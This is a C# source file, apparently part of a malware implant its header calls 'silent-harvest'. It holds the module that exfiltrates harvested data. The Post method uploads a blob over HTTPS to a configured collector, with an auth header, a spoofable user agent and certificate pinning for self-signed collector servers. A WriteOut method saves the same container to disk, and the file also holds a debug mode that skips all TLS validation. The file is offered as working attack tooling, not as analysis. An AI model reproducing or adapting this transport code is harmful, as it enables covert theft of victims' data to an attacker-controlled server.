// silent-harvest implant — exfil transport
using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace SilentHarvest
{
    public static class Exfil
    {
        /// <summary>
        /// TLS policy from Cfg.Pin:
        ///   ""          validate against the system trust store (default)
        ///   cert:HEX    pin the exact server certificate sha256 (use this for
        ///               self-signed collector certs)
        ///   any         accept anything -- DEBUG ONLY, no MITM protection
        /// </summary>
        private static bool ValidateServerCert(object sender, X509Certificate cert,
                                               X509Chain chain, SslPolicyErrors errors)
        {
            string mode = (Cfg.Pin ?? "").Trim().ToLowerInvariant();
            if (mode == "any")
            {
                Util.Log("tls: AcceptAnyCert mode (debug) - skipping validation");
                return true;
            }
            if (mode.StartsWith("cert:"))
            {
                string want = mode.Substring(5).Replace(":", "").Replace("-", "");
                string got = cert != null ? cert.GetCertHashString() : "";
                bool ok = want.Equals(got, StringComparison.OrdinalIgnoreCase);
                Util.Log("tls: pin {0} (want {1}.. got {2}..)",
                         ok ? "MATCH" : "MISMATCH",
                         want.Length > 8 ? want.Substring(0, 8) : want,
                         got.Length > 8 ? got.Substring(0, 8) : got);
                return ok;
            }
            if (errors != SslPolicyErrors.None)
                Util.Log("tls: system validation failed: {0}", errors);
            return errors == SslPolicyErrors.None;
        }

        public static bool Post(byte[] blob, string url)
        {
            try
            {
                // .NET 4 defaults can be TLS1.0; force 1.2+
                ServicePointManager.SecurityProtocol |= (SecurityProtocolType)3072;
                ServicePointManager.ServerCertificateValidationCallback =
                    ValidateServerCert;
                ServicePointManager.Expect100Continue = false;

                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                req.ContentType = "application/octet-stream";
                req.UserAgent = Cfg.UserAgent;
                if (!string.IsNullOrEmpty(Cfg.Auth))
                    req.Headers["X-SH-Auth"] = Cfg.Auth;
                req.Timeout = 30000;
                req.ReadWriteTimeout = 60000;
                req.AllowWriteStreamBuffering = false;
                req.ContentLength = blob.Length;
                req.KeepAlive = false;

                using (Stream s = req.GetRequestStream())
                {
                    int off = 0;
                    while (off < blob.Length)
                    {
                        int n = Math.Min(65536, blob.Length - off);
                        s.Write(blob, off, n);
                        off += n;
                    }
                }
                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                {
                    Util.Log("exfil: HTTP {0}", (int)resp.StatusCode);
                    return (int)resp.StatusCode == 200;
                }
            }
            catch (WebException we)
            {
                Util.Log("exfil failed: {0}", we.Message);
                if (we.Response != null) { try { ((HttpWebResponse)we.Response).Close(); } catch { } }
                return false;
            }
            catch (Exception e)
            {
                Util.Log("exfil failed: {0}", e.Message);
                return false;
            }
        }

        public static bool WriteOut(byte[] blob, string path)
        {
            try
            {
                using (FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write))
                    fs.Write(blob, 0, blob.Length);
                Util.Log("container written to {0} ({1} bytes)", path, blob.Length);
                return true;
            }
            catch (Exception e)
            {
                Util.Log("write failed: {0}", e.Message);
                return false;
            }
        }
    }
}
